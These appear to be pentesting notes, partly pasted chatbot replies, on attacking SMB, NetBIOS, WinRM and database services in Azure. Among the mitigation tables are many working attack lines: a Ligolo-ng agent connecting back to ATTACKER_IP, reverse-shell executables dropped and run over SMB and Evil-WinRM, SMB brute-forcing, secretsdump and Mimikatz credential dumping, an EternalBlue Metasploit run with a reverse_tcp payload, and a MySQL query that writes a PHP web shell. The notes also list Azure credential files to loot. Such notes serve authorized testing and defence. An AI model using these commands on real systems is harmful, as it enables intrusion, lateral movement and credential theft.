## SMB Enumeration

Here's a **corrected, summarized, and Azure-adapted version** of your **SMB Enumeration** section tailored for **penetration testing in Azure Cloud environments**. It includes **detailed steps, commands, techniques**, and **Azure security controls** required to mitigate the risks of exposed SMB services.

**SMB Enumeration in Azure Cloud – Pentesting Guide**

**🎯 Objective**

Identify and interact with exposed SMB services on Azure virtual machines (Windows-based), enumerate users, shares, and domain info, and assess misconfigurations or vulnerabilities in a **controlled and secure penetration testing environment**.

**🌐 Phase 1: Discover SMB Services**

**🔹 Step 1: Scan for SMB (Port 445)**

sudo nmap -p445 --open --script smb-os-discovery \<target\>

Or:

sudo nmap --script "smb\*" -p445 \<target\>

**Tip:** SMB on Azure-hosted VMs is **rarely public**, but often exposed **internally** within VNets or after compromising a user and pivoting via tools like Ligolo-ng or Chisel.

**🔹 Step 2: Network Broadcast Scan (Optional)**

sudo nbtscan -r \<subnet\> \# e.g., 10.0.0.0/24

Use to discover NetBIOS names across internal Azure subnets.

**🔐 Phase 2: Enumerate SMB Shares, Users, and Domains**

**🔹 Option 1: CrackMapExec (Fast and Powerful)**

crackmapexec smb \<target\>

crackmapexec smb \<target\> -u \<username\> -p \<password\> --shares

crackmapexec smb \<target\> -u \<username\> -p \<password\> --users

crackmapexec smb \<target\> -u \<username\> -p \<password\> --all

crackmapexec smb \<target\> -u \<username\> -p \<password\> -d \<domain\>

📌 For brute-force attacks:

crackmapexec smb \<target\> -u users.txt -p passwords.txt

**🔹 Option 2: SMBClient (Manual Interaction)**

smbclient -L //\<IP\> -N \# Anonymous

smbclient -L //\<IP\> -U \<username\> \# Authenticated

smbclient //\<IP\>/\<share\> -U \<username\>%\<pass\> \# Connect to share

Once connected:

recurse ON

prompt OFF

mask ""

mget \* \# Download everything

put file.txt \# Upload file (if writeable)

**🔹 Option 3: SMBMap (Quick Permission Overview)**

smbmap -H \<target\>

smbmap -H \<target\> -u \<username\> -p \<password\>

smbmap -H \<target\> -u \<username\> -p \<password\> -r \<sharename\>

**🔹 Option 4: Windows Commands (If Accessing From a Windows Pivot)**

net view \\\<IP\>

net use \\\<IP\>\\sharename\> /user:\<user\>

**📊 Post-Enumeration Objectives (Azure Context)**

After accessing a share:

- Look for:

  - .ps1, .kdbx, .rdp, .bak, .config, .xml files

  - Azure credentials (e.g., .azure/, AzureProfile.json)

  - Cached AccessTokens, PublishSettings, or servicePrincipalProfiles

**⚠️ Risk Mitigation – Azure Controls**

| **Azure Service / Feature** | **Security Control Description** |
|----|----|
| **NSG (Network Security Group)** | Deny port 445 from the internet. SMB should *never* be exposed externally. |
| **Private Endpoint / VNet** | Ensure file shares are only accessible via Private Link or internal subnets |
| **Azure Files Identity-Based Auth** | Enforce Azure AD or Active Directory authentication (disable anonymous/NTLM auth) |
| **Azure Defender for Storage** | Detects unusual access patterns or brute-force SMB access attempts |
| **Logging and Monitoring** | Enable diagnostic logs for storage accounts and alert on abnormal SMB activity |
| **Just-in-Time (JIT) Access** | Use to allow temporary, audited access to VMs for legitimate admin tasks |
| **Disable SMBv1** | Enforce SMBv2 or SMBv3 only; disable legacy support |

**✅ Best Practices for Secure SMB on Azure**

- ✅ **Avoid public IPs** on any machine with SMB

- ✅ Enforce **SMB signing and encryption** in internal networks

- ✅ Prefer **Azure Files with Azure AD** over classic SMB

- ✅ Regularly rotate and audit credentials

- ✅ Apply **least privilege** to share and NTFS permissions

- ✅ Monitor logs in **Azure Sentinel** or **Log Analytics**

Would you like this SMB module incorporated into a full **Azure VM pivoting + internal lateral movement playbook** with detection mappings and mitigations?

Here is a comprehensive **SMB enumeration and lateral movement module** fully integrated into an **Azure VM Pivoting and Internal Lateral Movement Playbook**, complete with commands, step-by-step guidance, detection mappings, and security mitigations:

**🛠️ Azure VM Pivoting & SMB Lateral Movement Playbook**

**📌 Scenario:**

You've gained initial access to an Azure VM (Windows or Linux) and want to pivot internally to enumerate and exploit other reachable Azure VMs or services via **SMB (TCP 445)**.

**🔹 Phase 1: Initial Foothold**

**✅ Step 1: Deploy Ligolo-ng (TUN-based Proxy) on Victim**

**On Attacker (Kali):**

sudo ip tuntap add user \$(whoami) mode tun ligolo

sudo ip link set ligolo up

./proxy -laddr 0.0.0.0:9001 -selfcert

**On Compromised Azure VM:**

./agent -connect \<ATTACKER_IP\>:9001 -ignore-cert

**Back on Attacker:**

\# In Ligolo-ng interactive shell:

session

start

**🔹 Phase 2: Internal Port Discovery (Scan Pivoted Subnet)**

nmap -sS -Pn -T4 -p445 \<internal-subnet-range\> --open

Example:

nmap -p445 10.0.2.0/24 --open -oG smb_hosts.txt

**🔹 Phase 3: SMB Enumeration on Discovered Hosts**

**✅ Step 3: Fast Info Gathering with CrackMapExec**

crackmapexec smb 10.0.2.5 -u user -p password --shares

crackmapexec smb 10.0.2.5 -u user -p password --users

crackmapexec smb 10.0.2.5 -u user -p password --groups

Add brute-force:

crackmapexec smb 10.0.2.5 -u users.txt -p passwords.txt

**✅ Step 4: Manual Share Access with SMBClient**

smbclient -L //10.0.2.5 -U \<user\>

smbclient //10.0.2.5/\<share\> -U \<user\>

Inside session:

recurse ON

prompt OFF

mget \*

put shell.exe

Use put to drop binaries or payloads into writable shares like C\$\Users\Public.

**✅ Step 5: Use SMBMap for Access Control Review**

smbmap -H 10.0.2.5 -u user -p password -d DOMAIN

**🔹 Phase 4: Lateral Movement via SMB**

**✅ Step 6: Drop and Execute Payload Over SMB**

\# Drop reverse shell or remote EXE

smbclient //10.0.2.5/C\$ -U \<user\>

put reverse_shell.exe

\# Then execute using WinRM, RDP, WMI, PsExec (if access available)

Or:

crackmapexec smb 10.0.2.5 -u user -p password -x 'C:\Users\Public\reverse_shell.exe'

**🔹 Phase 5: Post-Exploitation**

**Look for:**

- Azure credentials in C:\Users\\\AppData\Roaming\Azure

- Access tokens, publishsettings files, secrets

- Connections to Azure Files or Blob storage

- PowerShell transcripts or saved credentials

**🔎 Detection Mapping (Microsoft Defender for Endpoint / Sentinel)**

| **Activity** | **Detection Source** | **Rule / Alert Name Example** |
|----|----|----|
| SMB brute-force or enumeration | Microsoft Defender for Identity | "Multiple SMB logon failures" |
| Malicious file dropped via SMB | Defender for Endpoint | "Possible malware transfer via SMB" |
| Lateral movement using SMB exec tools | Defender + Sysmon via Sentinel | "Remote process execution over SMB" |
| Suspicious share access patterns | Azure Sentinel (Log Analytics) | Custom KQL: EventID==5145 |
| Anonymous or unauthorized share browsing | Azure Defender for Storage | "Unusual access" or "Access from new IP" |

**🛡️ Mitigation & Azure-Specific Security Controls**

| **Control / Feature** | **Purpose** |
|----|----|
| 🔒 NSGs | Block inbound port 445 externally and between subnets unless needed |
| 🔒 Azure Firewall / NSG Flow Logs | Detect SMB traffic routing across subnets or peers |
| 🔒 Azure Files + Private Endpoints | Never expose Azure SMB shares over public IP |
| 🔒 Azure AD or AD DS Authentication | Enforce identity-based access to file shares |
| 📋 Diagnostic Logs for Storage Accounts | Log SMB access attempts and share/file operations |
| 🔍 Microsoft Defender for Endpoint (MDE) | Monitor lateral movement, SMB client behavior, privilege escalation |
| ⏳ Just-In-Time Access for VMs | Limit exposure of management protocols including SMB |
| 🚫 Disable SMBv1 on Windows VMs | Enforce SMBv2/3 only |
| 🧱 Egress filtering via NSG or Azure Firewall | Prevent SMB tunnels to external IPs |

**✅ Summary**

SMB can be a powerful pivot and lateral movement vector in Azure, especially in hybrid or lifted-and-shifted Windows infrastructure. However, with proper **identity-based controls**, **network segmentation**, and **monitoring**, it can be effectively hardened.

Would you like the **next module** (e.g., **WinRM lateral movement** or **Azure Files exploitation**) structured in a similar format?

Perfect. Here's the **WinRM Lateral Movement Module** structured for Azure penetration testing.

**🛠️ Azure VM Pivoting – WinRM Lateral Movement Module**

**📌 Scenario:**

You have valid credentials or administrative access on an Azure Windows VM, and want to move laterally to other VMs using **WinRM (Windows Remote Management)** over **TCP 5985/5986**.

**🔹 Phase 1: Confirm WinRM Availability**

**✅ Step 1: Port Discovery**

nmap -p5985,5986 -sT \<internal-ip-range\> --open

**🔹 Phase 2: WinRM Enumeration**

**✅ Step 2: Test Authentication**

**Using PowerShell (Windows or PowerShell Core):**

Test-WsMan -ComputerName \<target_ip\>

**Using Impacket’s wmiexec.py / psexec.py:**

python3 wmiexec.py domain/user:password@\<target_ip\>

**Or Evil-WinRM (best tool):**

evil-winrm -i \<target_ip\> -u \<username\> -p \<password\>

You can also try:

evil-winrm -i \<target_ip\> -u \<username\> -H \<NTLM_hash\>

**🔹 Phase 3: Lateral Movement & Execution**

**✅ Step 3: File Transfer & Remote Execution**

**Upload file using Evil-WinRM:**

upload reverse.exe C:\Users\Public\reverse.exe

**Run commands interactively:**

evil-winrm -i \<target_ip\> -u \<username\> -p \<password\> -s

**Execute reverse shell:**

Start-Process "C:\Users\Public\reverse.exe"

**✅ Step 4: Enumerate Other Systems from Within**

Once on the second host, you can:

- Query AD (net group, net user /domain)

- Scan for more live hosts (PowerShell port scanning)

- Dump credentials (Mimikatz, LSASS)

**🔎 Detection Mapping (Microsoft Defender for Endpoint / Sentinel)**

| **Activity** | **Detection Tool** | **Example Rule or Alert** |
|----|----|----|
| WinRM remote command execution | Defender for Endpoint (MDE) | Suspicious remote PowerShell or WinRM activity |
| Lateral movement using Evil-WinRM | Microsoft Sentinel + Sysmon | Event ID 4688 + PowerShell telemetry |
| File upload to admin share | Azure Log Analytics | ProcessCreation or FileCreate alerts |
| Logon from unusual subnet/IP | Azure AD Sign-in Logs | Unfamiliar sign-in properties |

**🛡️ Mitigation & Azure-Specific Security Controls**

| **Azure Control / Feature** | **Description** |
|----|----|
| 🔒 NSG Rules | Restrict WinRM (5985/5986) between Azure subnets or only allow JumpBox |
| 🔒 Just-in-Time VM Access | Temporary enablement of admin ports only when needed |
| 🔒 Azure Bastion | Enforce jump-host strategy for VM access over HTTPS |
| 🔐 Azure AD Join + RBAC | Use identity-based access to Windows VMs instead of static credentials |
| 🛡️ Microsoft Defender for Endpoint (MDE) | Detect lateral movement, credential theft, and process injection |
| 📊 Log Analytics + Sentinel | Centralize and correlate remote command execution logs |

**✅ Summary**

WinRM is a powerful lateral movement vector in Azure due to its use of legitimate Windows features and default configurations. Hardening, segmentation, and detection layering are key to mitigation.

Would you like the **Azure Files exploitation** module now?

# SMB and NetBIOS Pentest

Certainly! Here's a **corrected and detailed step-by-step summary** of how to perform a **SMB and NetBIOS penetration test** on an Azure Windows VM, including commands, exploited vulnerabilities, and minute technical details:

**SMB and NetBIOS Penetration Testing on Azure Windows VM**

**Prerequisites & Lab Setup:**

- **Azure environment** with at least one Windows VM (target).

- Testing machine (attacker) with required tools installed:

  - **Nmap** — network scanner.

  - **Enum4Linux** — SMB enumeration.

  - **Metasploit Framework** — exploitation & post-exploitation.

  - **Impacket** — Python SMB utilities.

  - **Hashcat / John the Ripper** — password cracking.

  - **Mimikatz / LaZagne** — credentials extraction.

- Ensure **explicit authorization** for pentesting on Azure VMs to avoid legal issues.

- Confirm network access: your pentesting machine can reach the Azure VM (public IP or via VPN/Jump host).

**Step 1: Initial Reconnaissance - Network & Port Scanning**

**Goal:** Discover open SMB/NetBIOS ports and services on the Azure Windows VM.

- SMB typically uses:

  - TCP 445 (SMB direct)

  - TCP/UDP 137 (NetBIOS Name Service)

  - UDP 138 (NetBIOS Datagram Service)

  - TCP 139 (NetBIOS Session Service)

**Commands:**

\# Scan SMB and NetBIOS ports (both TCP and UDP)

nmap -p 137,138,139,445 -sU -sT -Pn \<Azure_VM_IP\>

- -sU = UDP scan (for ports 137, 138)

- -sT = TCP scan (for ports 139, 445)

- -Pn = no ping, useful in cloud environments

**Also scan all ports to find non-standard SMB ports:**

nmap -p- -sT -Pn \<Azure_VM_IP\>

**Step 2: NetBIOS Enumeration**

**Goal:** Identify NetBIOS names, domain/workgroup info, and shares.

**Commands:**

\# Use nbtscan to enumerate NetBIOS info

nbtscan \<Azure_VM_IP\>

\# UDP scan NetBIOS name service to find machine and workgroup names

nmap -sU -p 137 --script nbstat.nse \<Azure_VM_IP\>

**Step 3: SMB Enumeration**

**Goal:** List SMB shares, users, and gather detailed SMB info.

**Commands:**

\# List SMB shares (anonymous, if allowed)

smbclient -L //\<Azure_VM_IP\> -N

- -N attempts connection with **null (anonymous) session**.

\# Full SMB enumeration with enum4linux

enum4linux \<Azure_VM_IP\>

- Use additional flags to enumerate users and shares specifically:

enum4linux -U \<Azure_VM_IP\> \# Users

enum4linux -S \<Azure_VM_IP\> \# Shares

\# Impacket's smbclient.py for interactive SMB share access

python3 smbclient.py \<username\>@\<Azure_VM_IP\>

**Step 4: SMB Null Session Exploitation**

- If the server allows **null sessions**, you can access shares and enumerate users/groups without credentials.

- Null sessions are a critical misconfiguration on SMB.

**Test with:**

smbclient -L //\<Azure_VM_IP\> -N

- If shares and user lists are revealed, it’s a vulnerability to exploit.

**Step 5: Password Bruteforce and Hash Cracking**

**Goal:** Obtain credentials via brute force or hash cracking.

- Use **Hydra** or **Metasploit auxiliary modules** to brute force SMB login:

hydra -L users.txt -P passwords.txt smb://\<Azure_VM_IP\>

- Use **Impacket’s secretsdump.py** if credentials are obtained:

python3 secretsdump.py \<domain\>/\<username\>@\<Azure_VM_IP\>

- Dump password hashes (NTLM/LM).

- Crack hashes offline with Hashcat or John the Ripper:

hashcat -m 1000 hashes.txt wordlist.txt

**Step 6: SMB Vulnerability Exploitation**

**Goal:** Exploit known SMB vulnerabilities (e.g., EternalBlue).

- Use Metasploit modules:

msfconsole

use exploit/windows/smb/ms17_010_eternalblue

set RHOSTS \<Azure_VM_IP\>

set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LHOST \<attacker_IP\>

run

- Successful exploitation can yield remote code execution and shell access.

**Step 7: Post-Exploitation**

**After Access:**

- **Privilege Escalation:** Use tools like **winPEAS** or **PowerUp** to find local privilege escalation vectors.

Invoke-AllChecks.ps1 \# run from Meterpreter or PowerShell session

- **Persistence:** Create scheduled tasks, backdoors, or modify registry for continued access.

- **Credential Dumping:**

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

- Dump credentials to move laterally.

**Step 8: Lateral Movement & File Access**

- Use SMB shares to move across internal network shares:

net use \\\<Azure_VM_IP\>\share /user:\<username\> \<password\>

- Copy or execute files remotely using SMB shares.

**Step 9: Defense in Depth & Mitigations**

- SMB vulnerabilities can be mitigated by:

  - Disabling SMBv1.

  - Applying latest Windows patches.

  - Restricting SMB traffic via NSGs (Network Security Groups).

  - Implementing firewall rules and IDS/IPS systems.

  - Disabling anonymous/null sessions.

  - Enforcing strong password policies.

**Summary of Vulnerabilities Exploited**

| **Vulnerability/Weakness** | **Description** | **Exploitation Technique** |
|----|----|----|
| Open SMB ports (137-139,445) | Allows network SMB/NetBIOS communication | Port scanning, enumeration |
| Null Session Allowance | Unauthenticated SMB access | Anonymous share and user enumeration |
| Weak/Guessable Passwords | Credential brute forcing | Hydra, Metasploit brute force modules |
| Unpatched SMB Vulnerabilities (e.g., EternalBlue) | Remote code execution exploits | Metasploit EternalBlue module |
| Credential Exposure in Memory | Dumping passwords from memory | Mimikatz |
| SMB Share Misconfiguration | Sensitive shares accessible | smbclient, Impacket smbclient |

If you want, I can also provide a **fully scripted pentest checklist** or **automation scripts** for each step — just ask!

# SMB/445

- Anonymous credentials

- Grabbing banners for versions

- Null sessions

- Exploitation with RPCClient

  - List users: enumdomusers

  - Get user details: queryuser

  - Get user groups: queryusergroups

  - Get sid of user: lookupnames

  - Get users aliases: queryuseraliases

  - List groups: enumdomgroups

  - Get group details: querygroup

  - Get group members: querygroupmem

  - List alias: enumalsgroups

  - Get members: queryaliasmem builtin

  - List domains: enumdomains

  - Get sid: lsaquery

  - Domain info: querydominfo

  - Find sid by name: lookupnames

  - Find more sid’s: lsaenumsid

  - RID cycle (check more sid’s): lookupsid

<!-- -->

- Listing fileshares:

  - Null session: smbclient –no-pass –L //\<IP\>

  - Listing shares with credentials: smbclient –U ‘username\[%password\]’ –L \[--pw-nt-hash\] //\<IP\>

- Mount fileshares

  - Without credentials

  - With credentials

- SMB Relay Attack

**RTSP/554 or 8554**

- Gathering RTSP methods

- RTSP URL Bruteforce

- Cameradar can be used to access RTSP

**MSSQL/1433**

- Banner grabbing

- Basic information gathering

  - nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance name=MSSQLSERVER -sV -p 1433 IP

- Execute Commands with MSSQL

  - Authenticated: crackmapexec mssql -d Domain name\> -u -p -x "id“

  - UnAuthenticated: If xp_cmdshell is enabled, we can execute commands without authentication

- MSSQL Privilege Escalation

  - auxiliary/admin/mssql/mssql_escalate_dbowner

  - auxiliary/admin/mssql/mssql_escalate_execute_as

- A

**MySQL/3306**

- Enumerating with nmap

- Banner Grabbing

- Basic Commands

  - Enumerating Privileges: select grantee, table_schema, privilege_type FROM schema_privileges;

  - Enumerating File Privileges: select user,file_priv from mysql.user where user='root’;

  - Enumerating Current User: select user();

  - Writing File: select 1,2,"?php echo shell_exec(\$\_GET'c'\]);?",4 into OUTFILE 'C/xampp/htdocs/shell.php’;

  - Reading file: select load_file('/home/purabparihar/read_file.txt’);

  - User password change:

  - UPDATE mysql.user SET authentication_string=PASSWORD'MyNewPass') WHERE User='root’;

  - UPDATE mysql.user SET Password=PASSWORD'MyNewPass') WHERE User='root’;

- Extracting credentials:

  - mysql -u root --password=

**PostgreSQL/5432**

- Banner Grabbing

- DB Name Flag Injection

**Redis/6379**

- Banner grabbing

- Try accessing redis without credentials

- Enumeration after login

- Extracting information

- Extracting Connected Clients – Client list

- Extracting configuration – Config get \*

- Dumping Database: select database with keys

## Countermeasures to Recon

- **SMB (Server Message Block):**

  - **Disable on Unnecessary Servers:** Disable SMB on web and DNS servers, as they typically don't require this protocol.

  - **Restrict Internet Access:** Disable SMB on internet-facing servers to minimize attack surface.

  - **Block Ports:** Block ports TCP 139 and TCP 445, which are used by SMB.

  - **Limit Anonymous Access:** Restrict anonymous access through the RestrictNullSessAccess parameter in the Windows Registry.

## SMB Enumeration Countermeasures

Disable SMB protocol on Web and DNS Servers

Disable SMB protocol on Internet facing servers

Disable ports TCP 139 and TCP 445 used by the SMB protocol

Restrict anonymous access from the Windows Registry

Disable SMB protocol on Web and DNS Servers

Disable SMB protocol on Internet facing servers

Disable ports TCP 139 and TCP 445 used by the SMB protocol

Restrict anonymous access through RestrictNullSessAccess parameter from the Windows Registry
